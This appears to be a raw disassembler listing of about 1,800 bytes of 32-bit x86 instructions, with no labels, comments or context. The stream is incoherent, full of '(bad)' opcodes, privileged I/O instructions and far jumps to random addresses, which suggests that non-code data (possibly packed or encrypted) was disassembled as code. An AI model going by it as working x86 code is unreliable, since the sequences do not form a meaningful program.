  41ed7c:	stos   BYTE PTR es:[edi],al
  41ed7d:	push   ecx
  41ed7e:	int3   
  41ed7f:	jle    0x41ed35
  41ed81:	adc    ecx,DWORD PTR [ebx+0x7b488462]
  41ed87:	lods   al,BYTE PTR ds:[esi]
  41ed88:	dec    edx
  41ed89:	jmp    0x41edc5
  41ed8b:	dec    ecx
  41ed8c:	cmp    al,0xab
  41ed8e:	hlt    
  41ed8f:	rcr    BYTE PTR [edx],1
  41ed91:	inc    eax
  41ed92:	adc    eax,0xaf06fca1
  41ed97:	mov    ah,0x6e
  41ed99:	in     eax,dx
  41ed9a:	pop    esp
  41ed9b:	pop    edi
  41ed9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed9d:	aad    0x0
  41ed9f:	jmp    FWORD PTR [ebp+0x29]
  41eda2:	(bad)  
  41eda3:	std    
  41eda4:	imul   edx,DWORD PTR [ebx+edi*4+0x64],0xffffffab
  41eda9:	mov    WORD PTR ds:0xa13f9134,cs
  41edaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41edb0:	repnz or ah,al
  41edb3:	mov    edx,0xdbfba01b
  41edb8:	jmp    0x3fd5:0x5784f374
  41edbf:	xchg   esp,eax
  41edc0:	jne    0x41ee02
  41edc2:	dec    esp
  41edc3:	sub    ebp,ebp
  41edc5:	fadd   QWORD PTR [ebx]
  41edc7:	mov    WORD PTR [eax],gs
  41edc9:	repnz adc edx,DWORD PTR [esi+0x1656a098]
  41edd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41edd1:	mov    al,ds:0x8deac95b
  41edd6:	mov    ecx,0xef64e584
  41eddb:	mov    ecx,0x3af836bb
  41ede0:	(bad)  
  41ede1:	fcmovnbe st,st(4)
  41ede3:	scas   al,BYTE PTR es:[edi]
  41ede4:	lahf   
  41ede5:	nop
  41ede6:	jnp    0x41ee3e
  41ede8:	loope  0x41edc0
  41edea:	mov    al,0x3a
  41edec:	sub    BYTE PTR [edx+0x6c],cl
  41edef:	pop    esp
  41edf0:	dec    esi
  41edf1:	sub    ecx,DWORD PTR [eax-0x57]
  41edf4:	lmsw   WORD PTR ss:[ecx+0x58]
  41edf9:	add    ebp,DWORD PTR [edx+0x32]
  41edfc:	retf   
  41edfd:	fwait
  41edfe:	inc    esi
  41edff:	inc    ecx
  41ee00:	stc    
  41ee01:	int3   
  41ee02:	xor    dl,BYTE PTR [ebp+0x4c3dc370]
  41ee08:	popf   
  41ee09:	(bad)  ds:0x5f3021a1
  41ee0f:	sub    ecx,esi
  41ee11:	and    DWORD PTR [ebx-0x45],0x73
  41ee15:	dec    edi
  41ee16:	dec    ebp
  41ee17:	jns    0x41ee8e
  41ee19:	or     ecx,DWORD PTR gs:[ecx+eax*2+0x42]
  41ee1e:	ja     0x41eddf
  41ee20:	in     eax,0x65
  41ee22:	adc    eax,0xfffffff4
  41ee25:	xchg   ecx,eax
  41ee26:	cmp    dh,ah
  41ee28:	mov    eax,ds:0x9bb0104c
  41ee2d:	gs dec esp
  41ee2f:	mov    bh,BYTE PTR [ecx+0x2f]
  41ee32:	in     al,0x6d
  41ee34:	push   ds
  41ee35:	mov    dh,0xac
  41ee37:	arpl   WORD PTR [ecx+0xe28318d],sp
  41ee3d:	dec    eax
  41ee3e:	pop    ebx
  41ee3f:	cmp    ebx,DWORD PTR [esi-0x7584af1a]
  41ee45:	dec    DWORD PTR [edx]
  41ee47:	inc    ebx
  41ee48:	cs sbb dl,bh
  41ee4b:	xchg   ecx,eax
  41ee4c:	jle    0x41ee2a
  41ee4e:	mov    ebp,0x431dbb2d
  41ee53:	adc    eax,0xbec648f0
  41ee58:	cli    
  41ee59:	adc    esp,ebp
  41ee5b:	out    dx,al
  41ee5c:	dec    ecx
  41ee5d:	adc    dl,BYTE PTR [edx-0x26]
  41ee60:	js     0x41eecf
  41ee62:	mov    cl,0xd8
  41ee64:	call   0x4e9ba9d8
  41ee69:	push   cs
  41ee6a:	test   DWORD PTR [ebp-0x7c],0x2e2060d8
  41ee71:	sbb    DWORD PTR [ecx+0x73],0x3
  41ee75:	outs   dx,BYTE PTR ds:[esi]
  41ee76:	dec    ebx
  41ee77:	(bad)  
  41ee78:	icebp  
  41ee79:	(bad)  
  41ee7a:	cmp    eax,0x8018d75
  41ee7f:	lds    esi,FWORD PTR [ebx-0x7f]
  41ee82:	push   0x11c04dd0
  41ee87:	pop    ebp
  41ee88:	stos   BYTE PTR es:[edi],al
  41ee89:	scas   eax,DWORD PTR es:[edi]
  41ee8a:	inc    ecx
  41ee8b:	or     al,BYTE PTR [esi+ebp*1+0x32]
  41ee8f:	mov    esi,0x391604ce
  41ee94:	je     0x41eed7
  41ee96:	pop    esi
  41ee97:	aad    0xf4
  41ee99:	iret   
  41ee9a:	xchg   ebp,eax
  41ee9b:	out    0xef,al
  41ee9d:	add    ecx,DWORD PTR [edi+0x6eca17ff]
  41eea3:	mov    ch,0xd0
  41eea5:	pop    eax
  41eea6:	scas   eax,DWORD PTR es:[edi]
  41eea7:	push   ds
  41eea8:	cs cmp ch,ch
  41eeab:	jle    0x41ee32
  41eead:	je     0x41eed3
  41eeaf:	cwde   
  41eeb0:	in     eax,dx
  41eeb1:	mov    BYTE PTR [esi-0x5bdecefa],dh
  41eeb7:	add    esi,ecx
  41eeb9:	push   ecx
  41eeba:	xchg   edx,eax
  41eebb:	enter  0x11fa,0x2f
  41eebf:	xor    dh,bl
  41eec1:	test   al,0xa2
  41eec3:	adc    dh,BYTE PTR [edx]
  41eec5:	xchg   edx,eax
  41eec6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eec7:	jmp    0x41eeb5
  41eec9:	clc    
  41eeca:	or     BYTE PTR [edi-0x2b8a1d17],bl
  41eed0:	jae    0x41ee9d
  41eed2:	mov    ch,0x6a
  41eed4:	shl    BYTE PTR [esi+0x4d],0xa4
  41eed8:	push   esp
  41eed9:	call   0xafccfe68
  41eede:	(bad)  
  41eedf:	mov    ebx,0xbc5755f4
  41eee4:	popa   
  41eee5:	cmc    
  41eee6:	bnd jl 0x41eeaf
  41eee9:	cmc    
  41eeea:	xacquire xchg BYTE PTR [edi+0x71],bl
  41eeee:	jmp    0x6980b9ea
  41eef3:	cmp    esi,DWORD PTR [edx+0x22]
  41eef6:	data16 loope 0x41ef14
  41eef9:	pop    ebp
  41eefa:	les    eax,FWORD PTR [edi-0x104a59b9]
  41ef00:	mov    BYTE PTR [eax-0x5],dl
  41ef03:	lahf   
  41ef04:	or     eax,0x17d167ef
  41ef09:	sti    
  41ef0a:	popf   
  41ef0b:	int3   
  41ef0c:	sub    al,0xc6
  41ef0e:	ds push eax
  41ef10:	arpl   WORD PTR [ebx+0x37],sp
  41ef13:	xor    eax,0xb2e4711d
  41ef18:	(bad)  
  41ef19:	retf   
  41ef1a:	mov    eax,DWORD PTR cs:[ebx-0x2906fe98]
  41ef21:	ficomp DWORD PTR [ecx+0x5a]
  41ef24:	fs inc ebx
  41ef26:	icebp  
  41ef27:	psubsb mm1,QWORD PTR [ebp-0x3c]
  41ef2b:	je     0x41ef1c
  41ef2d:	jmp    0x41efab
  41ef2f:	or     eax,0x1dcb4a86
  41ef34:	inc    ecx
  41ef35:	cmp    bh,BYTE PTR [ebx]
  41ef37:	push   ebx
  41ef38:	inc    eax
  41ef39:	inc    ebx
  41ef3a:	dec    edx
  41ef3b:	jmp    0xd03dd9d0
  41ef40:	jb     0x41ef39
  41ef42:	mov    ah,0x7b
  41ef44:	repz test BYTE PTR gs:[ebx-0x21ba3bfa],ah
  41ef4c:	xor    cl,BYTE PTR [ecx+0x7e]
  41ef4f:	sub    eax,0x6575163c
  41ef54:	xchg   edx,eax
  41ef55:	dec    ecx
  41ef56:	loop   0x41ef85
  41ef58:	mov    edi,0xa07b8ada
  41ef5d:	adc    al,0x76
  41ef5f:	clc    
  41ef60:	jecxz  0x41ef78
  41ef62:	cmp    esp,edx
  41ef64:	aas    
  41ef65:	cmp    eax,DWORD PTR [ecx]
  41ef67:	mov    eax,0x8fe11bb1
  41ef6c:	inc    esp
  41ef6d:	cwde   
  41ef6e:	loope  0x41ef73
  41ef70:	cmp    ah,al
  41ef72:	int3   
  41ef73:	ror    ah,0x4e
  41ef76:	retf   
  41ef77:	pop    ebx
  41ef78:	stos   BYTE PTR es:[edi],al
  41ef79:	ja     0x41ef89
  41ef7b:	jge    0x41ef70
  41ef7d:	jne    0x41efe2
  41ef7f:	les    edi,FWORD PTR ds:0xf8367a8d
  41ef85:	(bad)  
  41ef86:	sahf   
  41ef87:	imul   edi,eax,0x6e
  41ef8a:	push   0x4e8edb13
  41ef8f:	and    BYTE PTR [ecx+0x6f26d41],ch
  41ef95:	sub    al,0x9c
  41ef97:	je     0x41ef7f
  41ef99:	xchg   ebp,eax
  41ef9a:	scas   eax,DWORD PTR es:[edi]
  41ef9b:	sahf   
  41ef9c:	scas   eax,DWORD PTR es:[edi]
  41ef9d:	mov    ds:0xc68b33c9,al
  41efa2:	push   0x39
  41efa4:	mov    edx,0xf6f65421
  41efa9:	and    BYTE PTR [edx+0x4f],0x39
  41efad:	mov    ds:0x5d6981cc,eax
  41efb2:	cwde   
  41efb3:	jbe    0x41ef71
  41efb5:	and    al,0xbf
  41efb7:	jle    0x41efbd
  41efb9:	push   edi
  41efba:	lods   eax,DWORD PTR ds:[esi]
  41efbb:	pop    ds
  41efbc:	xchg   ecx,eax
  41efbd:	dec    edi
  41efbe:	or     cl,BYTE PTR [esi-0x1b]
  41efc1:	and    edx,DWORD PTR [ecx]
  41efc3:	and    cl,dl
  41efc5:	xor    DWORD PTR [eax-0x16732600],eax
  41efcb:	jmp    0x6d06:0x8adcccc9
  41efd2:	pushf  
  41efd3:	pop    edi
  41efd4:	mov    ecx,0x828a4c9
  41efd9:	or     DWORD PTR [ebp+eiz*1+0x66],edx
  41efdd:	shl    BYTE PTR ds:0x67bac93e,0x73
  41efe4:	adc    al,0xd7
  41efe6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41efe7:	and    DWORD PTR [ecx],edx
  41efe9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41efea:	cmp    cl,BYTE PTR [ebx]
  41efec:	mov    bl,BYTE PTR [edx]
  41efee:	add    ebp,edi
  41eff0:	dec    edi
  41eff1:	and    al,0xd
  41eff3:	cmp    DWORD PTR [edi],esp
  41eff5:	jl     0x41f010
  41eff7:	jae    0x41f06f
  41eff9:	adc    edx,DWORD PTR [ebp-0x4e277caf]
  41efff:	mov    esi,0xe2598398
  41f004:	cld    
  41f005:	cmp    eax,DWORD PTR [ebp-0x729cc6ca]
  41f00b:	xor    al,0xb0
  41f00d:	pop    ss
  41f00e:	lock arpl WORD PTR [edi-0x489bde52],di
  41f015:	cdq    
  41f016:	push   esp
  41f017:	rcr    ecx,0xc7
  41f01a:	popa   
  41f01b:	pop    esi
  41f01c:	or     eax,DWORD PTR [ebp+0x562aed7]
  41f022:	cwde   
  41f023:	inc    esi
  41f024:	retf   
  41f025:	movaps xmm0,xmm1
  41f028:	push   ebp
  41f029:	(bad)  
  41f02a:	aad    0x58
  41f02c:	and    eax,0xb9519fc5
  41f031:	dec    ebx
  41f032:	dec    esp
  41f033:	pop    edi
  41f034:	loop   0x41f084
  41f036:	data16 hlt 
  41f038:	ret    0x50de
  41f03b:	rol    DWORD PTR [edi-0x51],1
  41f03e:	outs   dx,BYTE PTR ds:[esi]
  41f03f:	lahf   
  41f040:	dec    edi
  41f041:	sub    al,0xb5
  41f043:	repz sbb esi,esi
  41f046:	scas   al,BYTE PTR es:[edi]
  41f047:	pop    edi
  41f048:	mov    eax,ds:0xa3b53c4f
  41f04d:	adc    al,0x7b
  41f04f:	cld    
  41f050:	mov    ch,0x14
  41f052:	push   ds
  41f053:	out    0x63,eax
  41f055:	and    BYTE PTR [eax-0x51],0x8e
  41f059:	mov    bl,BYTE PTR [ebp+0x1e]
  41f05c:	mov    ecx,0x2386d202
  41f061:	inc    ecx
  41f062:	mov    eax,DWORD PTR [ebx]
  41f064:	jae    0x41f08d
  41f066:	in     eax,0x5e
  41f068:	and    BYTE PTR [eax+0x467ea119],ch
  41f06e:	cld    
  41f06f:	inc    eax
  41f070:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f071:	add    eax,0x1b737a64
  41f076:	fld    DWORD PTR [edi-0x1b]
  41f079:	outs   dx,BYTE PTR ds:[esi]
  41f07a:	push   0xe
  41f07c:	outs   dx,BYTE PTR ds:[esi]
  41f07d:	xchg   ebp,edi
  41f07f:	jbe    0x41f00a
  41f081:	aam    0x8a
  41f083:	shl    ch,1
  41f085:	test   bl,bh
  41f087:	in     eax,0x4c
  41f089:	das    
  41f08a:	mov    ebp,0xeb694e82
  41f090:	ror    BYTE PTR [edx],0xcc
  41f093:	leave  
  41f094:	cmp    sp,bp
  41f097:	test   eax,0x6cb8e931
  41f09c:	adc    al,BYTE PTR [edx]
  41f09e:	fabs   
  41f0a0:	add    ecx,eax
  41f0a2:	jmp    0xb6a9:0xb93293ae
  41f0a9:	or     al,0x5
  41f0ab:	mov    ds:0x2d386cdc,eax
  41f0b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0b1:	mov    al,ds:0x81a45e11
  41f0b6:	lods   al,BYTE PTR ds:[esi]
  41f0b7:	fwait
  41f0b8:	inc    esp
  41f0b9:	test   BYTE PTR [eax-0x70],ch
  41f0bc:	retf   
  41f0bd:	mov    eax,ds:0xdffec09d
  41f0c2:	pop    eax
  41f0c3:	adc    ecx,esp
  41f0c5:	mov    eax,ds:0x9f2ec05a
  41f0ca:	shl    DWORD PTR [eax+0x2c],1
  41f0cd:	cmc    
  41f0ce:	std    
  41f0cf:	xor    ecx,edx
  41f0d1:	cwde   
  41f0d2:	cdq    
  41f0d3:	pop    esp
  41f0d4:	lods   eax,DWORD PTR ds:[esi]
  41f0d5:	pushf  
  41f0d6:	jl     0x41f0e9
  41f0d8:	xor    eax,0xec2087c8
  41f0dd:	call   0xaf34:0x8b82c970
  41f0e4:	ja     0x41f0d5
  41f0e6:	sbb    ah,BYTE PTR [edx+0x65]
  41f0e9:	push   ebx
  41f0ea:	mov    ah,0xb3
  41f0ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0ed:	cmp    dh,BYTE PTR [esi]
  41f0ef:	dec    eax
  41f0f0:	cmc    
  41f0f1:	dec    ecx
  41f0f2:	faddp  st(5),st
  41f0f4:	pop    ss
  41f0f5:	xchg   esi,eax
  41f0f6:	loop   0x41f0b0
  41f0f8:	and    esp,ebx
  41f0fa:	repz pop edx
  41f0fc:	syscall 
  41f0fe:	(bad)  
  41f0ff:	and    al,0x5a
  41f101:	inc    ecx
  41f102:	(bad)  
  41f104:	in     eax,0xf2
  41f106:	(bad)  
  41f107:	mov    edx,0x7c9e9561
  41f10c:	push   ebp
  41f10d:	aam    0x31
  41f10f:	iret   
  41f110:	in     eax,dx
  41f111:	stc    
  41f112:	cmp    esi,DWORD PTR [edi]
  41f114:	test   eax,0x15ed7c1c
  41f119:	dec    ebp
  41f11a:	mov    ch,0x75
  41f11c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f11d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f11e:	cdq    
  41f11f:	sbb    al,0x2f
  41f121:	stos   DWORD PTR es:[edi],eax
  41f122:	repnz xlat BYTE PTR ds:[ebx]
  41f124:	stc    
  41f125:	iret   
  41f126:	jbe    0x41f178
  41f128:	mov    cl,0x21
  41f12a:	xor    DWORD PTR [esi],edx
  41f12c:	mov    esi,0xa2cd6268
  41f131:	shr    ch,0xf1
  41f134:	shl    bh,cl
  41f136:	adc    edx,ebx
  41f138:	fild   WORD PTR [eax]
  41f13a:	pop    edi
  41f13b:	mov    al,0x17
  41f13d:	cmc    
  41f13e:	and    eax,0xaba3d7f5
  41f143:	xchg   edx,eax
  41f144:	sub    eax,0xf4da58a0
  41f149:	push   0xce6f0866
  41f14e:	mov    cl,ch
  41f150:	mov    ah,0x75
  41f152:	int    0xac
  41f154:	packssdw mm7,QWORD PTR [ebx-0x2e]
  41f158:	jg     0x41f19b
  41f15a:	pop    esi
  41f15b:	mov    al,ds:0x7376feaa
  41f160:	cmc    
  41f161:	jns    0x41f15f
  41f163:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f164:	mov    cl,0xfa
  41f166:	loope  0x41f1e7
  41f168:	adc    DWORD PTR [esi-0x7e],0xffffffbd
  41f16c:	xor    BYTE PTR es:0xa6c88a00,0xa0
  41f174:	fidiv  WORD PTR [ecx-0x50]
  41f177:	xchg   ebp,eax
  41f178:	les    ecx,FWORD PTR [edx+ebp*1]
  41f17b:	xchg   DWORD PTR [ebp-0x1c],esi
  41f17e:	out    0xde,eax
  41f180:	fimul  WORD PTR [eax]
  41f182:	push   0xe8917d0b
  41f187:	cli    
  41f188:	out    0xe8,al
  41f18a:	or     DWORD PTR [edx],ecx
  41f18c:	push   ecx
  41f18d:	shl    esi,1
  41f18f:	ja     0x41f14d
  41f191:	scas   eax,DWORD PTR es:[edi]
  41f192:	sub    dh,BYTE PTR [edi+0x2dc7681a]
  41f198:	mov    BYTE PTR [ebx+0x32],al
  41f19b:	nop
  41f19c:	pop    edx
  41f19d:	inc    edx
  41f19e:	jbe    0x41f18a
  41f1a0:	add    al,0x6e
  41f1a2:	pop    ss
  41f1a3:	push   cs
  41f1a4:	outs   dx,DWORD PTR ds:[esi]
  41f1a5:	jecxz  0x41f1a2
  41f1a7:	mov    bh,0x86
  41f1a9:	ds xchg esp,eax
  41f1ab:	or     eax,0x313b446e
  41f1b0:	es inc eax
  41f1b2:	mov    eax,0x3c80772c
  41f1b7:	xor    ebx,ecx
  41f1b9:	int    0x89
  41f1bb:	test   ebx,eax
  41f1bd:	mov    ds:0x418f1977,al
  41f1c2:	imul   esi,DWORD PTR [ebx+ebp*2+0x36],0x512c1b4e
  41f1ca:	sub    esp,ebx
  41f1cc:	lea    ebx,[eax+ebp*2-0x79c3e914]
  41f1d3:	int3   
  41f1d4:	push   ds
  41f1d5:	lds    esp,FWORD PTR [edi]
  41f1d7:	mov    ebx,0xed4c52d8
  41f1dc:	fsubr  DWORD PTR [edi+0x59fc50a3]
  41f1e2:	fiadd  WORD PTR ds:0x48931ab5
  41f1e8:	(bad)  
  41f1e9:	jns    0x41f25d
  41f1eb:	and    al,0xe5
  41f1ed:	jp     0x41f258
  41f1ef:	xor    al,0x9f
  41f1f1:	jl     0x41f22b
  41f1f3:	pop    esi
  41f1f4:	outs   dx,DWORD PTR ds:[esi]
  41f1f5:	push   es
  41f1f6:	mov    al,0x17
  41f1f8:	adc    bh,al
  41f1fa:	les    esi,FWORD PTR [edi-0x10]
  41f1fd:	sahf   
  41f1fe:	dec    esp
  41f1ff:	dec    ecx
  41f200:	push   ss
  41f201:	mov    cl,0xf6
  41f203:	repnz inc ebx
  41f205:	ret    0x7312
  41f208:	add    DWORD PTR [ebp-0x1fd1d8b],ebx
  41f20e:	jecxz  0x41f276
  41f210:	retf   0x8e45
  41f213:	outs   dx,BYTE PTR ds:[esi]
  41f214:	adc    al,0xbc
  41f216:	es push ebx
  41f218:	xchg   DWORD PTR [edi],edx
  41f21a:	(bad)  
  41f21b:	xchg   BYTE PTR [eax],cl
  41f21d:	fwait
  41f21e:	out    0x13,eax
  41f220:	cmp    BYTE PTR [edi],ah
  41f222:	gs mov edx,0x8fb5107f
  41f228:	jne    0x41f1c6
  41f22a:	inc    ecx
  41f22b:	scas   al,BYTE PTR es:[edi]
  41f22c:	sbb    BYTE PTR [edx+0x54],ch
  41f22f:	div    DWORD PTR [ecx-0x23]
  41f232:	ss sbb eax,0xd47d00ae
  41f238:	jne    0x41f29f
  41f23a:	in     al,dx
  41f23b:	sbb    al,0x98
  41f23d:	jae    0x41f1eb
  41f23f:	ret    0x87df
  41f242:	mov    esi,0xd920aab2
  41f247:	pop    ebx
  41f248:	or     eax,0x6c43d69c
  41f24d:	sub    DWORD PTR [esp+ecx*2],edx
  41f250:	jmp    0x41f294
  41f252:	push   esp
  41f253:	idiv   dl
  41f255:	or     BYTE PTR [edi-0x4b79aac0],dh
  41f25b:	add    BYTE PTR [eax+0x6b],al
  41f25e:	xor    ah,BYTE PTR [esi]
  41f260:	daa    
  41f261:	pop    ecx
  41f262:	xor    al,dh
  41f264:	pop    ecx
  41f265:	lds    ecx,FWORD PTR [eax+0x52a54eab]
  41f26b:	xchg   ebp,eax
  41f26c:	bound  esi,QWORD PTR [ecx+0xb7cdf]
  41f272:	aam    0x3d
  41f274:	(bad)  
  41f275:	aam    0xb7
  41f277:	sahf   
  41f278:	jns    0x41f263
  41f27a:	xchg   edx,eax
  41f27b:	cmp    DWORD PTR [edx],ebp
  41f27d:	jmp    0x41f2b2
  41f27f:	icebp  
  41f280:	fisub  WORD PTR [si]
  41f283:	mov    ah,0xdc
  41f285:	mov    ch,0x84
  41f287:	add    bh,BYTE PTR [eax-0x1c]
  41f28a:	lods   al,BYTE PTR ds:[esi]
  41f28b:	inc    DWORD PTR [edi+0x7]
  41f28e:	add    BYTE PTR [edi],bh
  41f290:	pushf  
  41f291:	das    
  41f292:	mov    eax,ds:0x6ce2f89
  41f297:	(bad)  
  41f298:	adc    BYTE PTR [ecx+ebx*1+0x7b9e0d43],al
  41f29f:	jecxz  0x41f26d
  41f2a1:	dec    eax
  41f2a2:	in     al,dx
  41f2a3:	jae    0x41f23b
  41f2a5:	push   esp
  41f2a6:	aam    0x81
  41f2a8:	pusha  
  41f2a9:	in     al,0xb8
  41f2ab:	stos   BYTE PTR es:[edi],al
  41f2ac:	push   ss
  41f2ad:	xchg   ecx,eax
  41f2ae:	add    dl,BYTE PTR [edi+0x6c]
  41f2b1:	add    BYTE PTR [esi],ah
  41f2b3:	dec    eax
  41f2b4:	setp   BYTE PTR [eax+0x5b4c729a]
  41f2bb:	mul    BYTE PTR [ebx-0x7a]
  41f2be:	mov    esp,0xccb1e69f
  41f2c3:	cld    
  41f2c4:	ror    DWORD PTR [ebx+0x17],1
  41f2c7:	or     esi,DWORD PTR [esi-0x35]
  41f2ca:	sub    BYTE PTR [edx],dl
  41f2cc:	cld    
  41f2cd:	or     edi,DWORD PTR ds:0xbb6129a6
  41f2d3:	inc    ecx
  41f2d4:	into   
  41f2d5:	loop   0x41f27e
  41f2d7:	aam    0x59
  41f2d9:	daa    
  41f2da:	jecxz  0x41f2d5
  41f2dc:	jmp    0x41f30e
  41f2de:	(bad)  
  41f2df:	(bad)  
  41f2e0:	hlt    
  41f2e1:	ret    0x344e
  41f2e4:	or     dl,BYTE PTR [edx+esi*2+0x3]
  41f2e8:	cmp    al,0x38
  41f2ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f2eb:	fld    QWORD PTR [edx]
  41f2ed:	int3   
  41f2ee:	and    al,0x4c
  41f2f0:	rol    DWORD PTR [ebp+0x2dac44e9],1
  41f2f6:	(bad)  
  41f2f7:	out    0xf3,al
  41f2f9:	aas    
  41f2fa:	mov    ecx,esp
  41f2fc:	jg     0x41f307
  41f2fe:	das    
  41f2ff:	shl    cl,0x57
  41f302:	lock cmp al,0xe0
  41f305:	mov    WORD PTR [ecx-0x613f34c6],?
  41f30b:	ins    DWORD PTR es:[edi],dx
  41f30c:	dec    edi
  41f30d:	dec    edx
  41f30e:	adc    al,0xb8
  41f310:	test   ecx,edi
  41f312:	and    esp,esp
  41f314:	(bad)  
  41f315:	popf   
  41f316:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f317:	mov    DWORD PTR [ecx+eax*2-0xfa97266],edi
  41f31e:	outs   dx,BYTE PTR ds:[esi]
  41f31f:	jecxz  0x41f2a1
  41f321:	pop    ss
  41f322:	or     eax,DWORD PTR [esi]
  41f324:	pop    edx
  41f325:	lods   al,BYTE PTR ds:[esi]
  41f326:	aaa    
  41f327:	sbb    ebp,edx
  41f329:	push   ecx
  41f32a:	xchg   ebx,eax
  41f32b:	repnz rol BYTE PTR [ebp+0x4a],1
  41f32f:	aad    0xd4
  41f331:	(bad)  
  41f332:	(bad)  
  41f333:	rcr    DWORD PTR [ecx-0x11],1
  41f336:	cli    
  41f337:	test   edx,esi
  41f339:	inc    edx
  41f33a:	push   cs
  41f33b:	and    al,0xc
  41f33d:	sbb    bh,BYTE PTR [ebx-0x270f6b87]
  41f343:	outs   dx,BYTE PTR ds:[esi]
  41f344:	xchg   edi,eax
  41f345:	fwait
  41f346:	pop    ebx
  41f347:	pop    ds
  41f348:	adc    BYTE PTR [esi],ah
  41f34a:	adc    BYTE PTR [edx],0x37
  41f34d:	loopne 0x41f33b
  41f34f:	sbb    edx,DWORD PTR ds:0x1ec09794
  41f355:	inc    ebx
  41f356:	jecxz  0x41f341
  41f358:	icebp  
  41f359:	pop    esi
  41f35a:	jg     0x41f3be
  41f35c:	push   ds
  41f35d:	and    eax,DWORD PTR [eax-0x33]
  41f360:	scas   eax,DWORD PTR es:[edi]
  41f361:	or     BYTE PTR [eax],bh
  41f363:	add    al,0x50
  41f365:	stos   BYTE PTR es:[edi],al
  41f366:	jne    0x41f316
  41f368:	aad    0xc6
  41f36a:	outs   dx,DWORD PTR ds:[esi]
  41f36b:	iret   
  41f36c:	pop    ebp
  41f36d:	pop    ebp
  41f36e:	jb     0x41f318
  41f370:	sub    eax,0xb8642403
  41f375:	jp     0x41f350
  41f377:	lahf   
  41f378:	repz jl 0x41f3f7
  41f37b:	mov    bl,0x43
  41f37d:	into   
  41f37e:	hlt    
  41f37f:	and    eax,0x6417901a
  41f384:	cmc    
  41f385:	fwait
  41f386:	(bad)  
  41f387:	pop    ebx
  41f388:	les    edi,FWORD PTR [esi-0xb81897b]
  41f38e:	jmp    0x41f358
  41f390:	inc    edx
  41f391:	mov    WORD PTR [eax+0xbf62ae0],es
  41f397:	sub    ebx,esp
  41f399:	test   BYTE PTR fs:[esp+ecx*4],al
  41f39d:	or     BYTE PTR [esi+0x59],cl
  41f3a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f3a1:	jo     0x41f3a1
  41f3a3:	fldcw  WORD PTR [ecx]
  41f3a5:	lock dec eax
  41f3a7:	ins    BYTE PTR es:[edi],dx
  41f3a8:	lahf   
  41f3a9:	test   al,0xa9
  41f3ab:	or     cl,BYTE PTR [ecx+eiz*1]
  41f3ae:	add    dl,cl
  41f3b0:	inc    ebx
  41f3b1:	cmc    
  41f3b2:	cdq    
  41f3b3:	sub    eax,0xd9070997
  41f3b8:	push   esp
  41f3b9:	rol    DWORD PTR [edx-0x7a4574c8],cl
  41f3bf:	gs or  eax,0x156a378f
  41f3c5:	lock and DWORD PTR [esi],esp
  41f3c8:	or     edi,DWORD PTR [eax-0x5e]
  41f3cb:	lahf   
  41f3cc:	dec    BYTE PTR [ebx-0x1aecb43c]
  41f3d2:	test   BYTE PTR cs:[ebx],0xc7
  41f3d6:	je     0x41f422
  41f3d8:	add    ebp,ecx
  41f3da:	sbb    al,0x3c
  41f3dc:	and    DWORD PTR [ecx+0x77],0xfe648758
  41f3e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f3e4:	ficom  WORD PTR [edi]
  41f3e6:	dec    BYTE PTR [eax-0x2]
  41f3e9:	(bad)  
  41f3ea:	call   0x51cf:0x485178cd
  41f3f1:	push   eax
  41f3f2:	imul   eax,DWORD PTR [ebx-0x4],0x62
  41f3f6:	inc    edx
  41f3f7:	xor    edx,ebp
  41f3f9:	repnz add BYTE PTR [ebx],dh
  41f3fc:	add    DWORD PTR [esi+0x60afcaa2],0xffffffa5
  41f403:	xor    al,bh
  41f405:	or     DWORD PTR [eax+0x5dfc91ad],ecx
  41f40b:	ss inc esi
  41f40d:	mov    BYTE PTR [ebp+0x7],bl
  41f410:	mov    DWORD PTR [esi-0x1],ebx
  41f413:	dec    ebx
  41f414:	push   ss
  41f415:	sahf   
  41f416:	push   ebx
  41f417:	jge    0x41f3b2
  41f419:	adc    dh,BYTE PTR [edi+ebx*2-0x51748c4b]
  41f420:	push   0xfe005ae6
  41f425:	lahf   
  41f426:	push   ebp
  41f427:	xchg   BYTE PTR [edx+eax*8+0x588a220a],al
  41f42e:	push   edx
  41f42f:	daa    
  41f430:	xor    ecx,DWORD PTR [ecx-0x2018b59a]
  41f436:	arpl   WORD PTR [edx-0x2853b8cb],bx
  41f43c:	xor    DWORD PTR [ebx-0x5ecc1b16],0x51132143
  41f446:	adc    eax,0x275accaf
  41f44b:	cmp    eax,0x3f73f9a2
  41f450:	pop    ss
  41f451:	ja     0x41f454
  41f453:	xlat   BYTE PTR ds:[ebx]
  41f454:	retf   0xacb8
  41f457:	jo     0x41f41b
  41f459:	sub    al,0x3
  41f45b:	cdq    
  41f45c:	inc    esp
  41f45d:	(bad)  
  41f45e:	mov    ch,0xa8
  41f460:	mov    DWORD PTR [ebx-0x149828c1],edx
  41f466:	xchg   ebx,eax
  41f467:	outs   dx,BYTE PTR ds:[esi]
  41f468:	inc    ebp
  41f469:	fcmovnbe st,st(6)
  41f46b:	cdq    
  41f46c:	out    0x42,al
  41f46e:	shr    BYTE PTR [eax-0x63df2b23],1
  41f474:	test   BYTE PTR [ebx],ah
  41f476:	or     ecx,DWORD PTR [ebp-0x6ddeff93]
  41f47c:	jne    0x41f418
  41f47e:	rcr    esi,0x28
  41f481:	into   
  41f482:	jno    0x41f4b7
  41f484:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f485:	dec    ebp
  41f486:	pop    eax
  41f487:	dec    esi
  41f488:	das    
  41f489:	sbb    BYTE PTR [ebx],ch
  41f48b:	loopne 0x41f436
